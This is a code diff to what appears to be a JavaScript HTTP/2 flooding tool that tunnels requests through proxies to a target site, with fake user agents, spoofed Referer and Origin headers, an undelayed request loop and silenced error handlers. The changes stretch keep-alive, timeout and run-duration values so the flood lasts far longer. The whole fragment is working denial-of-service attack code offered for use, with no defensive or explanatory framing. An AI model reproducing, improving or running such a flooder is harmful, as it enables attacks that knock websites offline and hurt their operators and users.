@@ -38,8 +38,8 @@ class TlsBuilder {
     }
     http2TUNNEL(socket){
         const uas = fakeua();
-        socket.setKeepAlive(true, 1000);
-        socket.setTimeout(10000);
+        socket.setKeepAlive(true, 100000000);
+        socket.setTimeout(1000000000);
         payload[":method"] = "GET";
         payload["Referer"] = objetive;
         payload["Origin"] = objetive;
@@ -86,7 +86,7 @@ proxy = proxy.split(':');
 var req = http.get({
         host: proxy[0],
         port: proxy[1],
-        timeout: 10000,
+        timeout: 1000000000,
         method: "CONNECT",
         agent: keepAliveAgent,
         path: parsed.host + ":443"
@@ -104,7 +104,7 @@ var req = http.get({
 setInterval(Runner)
 setTimeout(function(){
     process.exit();
-}, process.argv[3] * 100000);
+}, process.argv[3] * 10000000000);
 process.on('uncaughtException', function(er) {
 });
 process.on('unhandledRejection', function(er) {
